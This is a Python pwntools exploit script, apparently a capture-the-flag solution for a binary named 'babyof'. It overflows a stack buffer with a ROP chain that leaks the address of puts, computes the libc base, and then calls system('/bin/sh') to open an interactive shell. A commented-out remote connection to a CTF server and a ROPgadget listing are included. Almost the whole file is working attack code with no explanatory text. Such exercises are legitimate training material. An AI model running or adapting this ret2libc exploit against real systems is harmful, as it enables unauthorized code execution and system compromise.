from pwn import *
from LibcSearcher import*
# context.log_level='debug'
# context.os='linux'
# context.arch='amd64'
# context.terminal=['tmux','splitw','-h']

# io=remote("1.14.71.254",28843)
io=process("./babyof")
elf=ELF("./babyof")
libc=ELF("./libc-2.27.so")

pop_rdi_addr=0x400743
ret_addr=0x400506
start_addr=0x40066b
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
payload1=cyclic(0x48)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
# gdb.attach(io)
# pause()
io.recvuntil(b"flow?")
io.sendline(payload1)
# puts_addr=u64(io.recv(6).ljust(8,b'\x00'))
# puts_addr=u64(io.recv(6).ljust(8, b'\x00'))
puts_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_addr-libc.symbols[b"puts"]
sys_addr=libc_base+libc.symbols[b"system"]
bin_addr=libc_base+next(libc.search(b"/bin/sh"))


print("puts_plt:  "+hex(puts_plt))
print("puts_got:  "+hex(puts_got))
print("puts_addr:  "+hex(puts_addr))
print("libc_base:  "+hex(libc_base))
print("sys_addr:  "+hex(sys_addr))
print("bin_offset:  "+hex(next(libc.search(b"/bin/sh"))))
print("bin_addr:  "+hex(bin_addr))


payload2=cyclic(0x48)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.recvuntil(b"flow?")
io.sendline(payload2)
io.interactive()






# Gadgets information
# ============================================================
# 0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400740 : pop r14 ; pop r15 ; ret
# 0x0000000000400742 : pop r15 ; ret
# 0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400619 : pop rbp ; ret
# 0x0000000000400743 : pop rdi ; ret
# 0x0000000000400741 : pop rsi ; pop r15 ; ret
# 0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400506 : ret
# 0x0000000000400870 : ret 0xfffd

# Unique gadgets found: 12


